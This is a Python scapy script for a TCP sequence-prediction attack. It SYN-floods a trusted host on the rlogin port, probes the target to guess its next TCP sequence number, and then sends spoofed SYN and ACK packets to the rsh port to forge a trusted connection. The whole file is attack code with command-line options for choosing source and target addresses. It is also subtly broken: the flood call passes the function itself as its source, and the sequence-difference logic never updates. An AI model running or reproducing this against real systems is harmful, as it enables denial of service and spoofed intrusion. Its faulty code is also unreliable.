#-*- coding:utf-8 -*-
import optparse
from scapy.all import *

def synFlood(src,tgt):
    for sport in range(1024,65535):
        IPlayer = IP(src=src,dst=tgt)
        TCPlayer = TCP(sport=sport,dport=513)
        pkt = IPlayer/TCPlayer
        send(pkt)

def calTSN(tgt):
    seqNum = 0
    preNum  =0
    diffSeq= 0
    for x in range(1,5):
        if preNum != 0:
            preNum = seqNum
        pkt= IP(dst = tgt)/TCP()
        ans = sr1(pkt,verbose=0)
        seqNum = ans.getlayer(TCP).seq 
        diffSeq = seqNum -preNum
        print ("[+] TCP Seq Difference :"+str(diffSeq))
    return seqNum+diffSeq
#tgt = "192.168.1.112"
#seqNum = calTSN(tgt)
#print ("[+] Next TCP sequence Number to ACK is "+str(seqNum+1))

def spoofConn(src,tgt,ack):
    IPlayer = IP(src=src,dst=tgt)
    TCPlayer = TCP(sport=513,dport=514)
    synPkt = IPlayer/TCPlayer
    send(synPkt)
    IPlayer = IP(src = src,dst = tgt)
    TCPlayer = TCP(sport=513,dport=514,ack=ack)
    ackPkt = IPlayer/TCPlayer
    send(ackPkt)

#src = "192.168.56.1"
#tgt = "192.168.1.112"
#seqNum = 2670575288
#spoofConn(src,tgt,seqNum)


def main():
    parser = optparse.OptionParser('usage%prog -s<src for SYN Flood> -S <src for spoofed connection> -t <targt address>')
    parser.add_option('-s',dest='synSpoof',type = 'string',help='specify src fpr SNY connection')
    parser.add_option('-S',dest='srcSpoof',type = 'string',help='specify src fpr spoofed connection')
    parser.add_option('-t',dest='tgt',type = 'string',help='specify src fpr target address')
    (options,args) =parser.parse_args()
    if options.synSpoof ==None or options.srcSpoof ==None or options.tgt ==None:
        print (parser.usage)
    else:
        synSpoof = options.synSpoof
        srcSpoof  = options.srcSpoof
        tgt = options.tgt
        print ('[+]start SYN FLood to supperess remote server')
        synFlood(synFlood,srcSpoof)
        print ('[+] calculating correct TCP Sequence Number ')
        seqNum = calTSN(tgt) + 1
        print ("[+] sspoofing Connection")
        spoofConn(srcSpoof,tgt,seqNum)
        print ('[+ ] done')
if __name__ =="__main__":
    main()

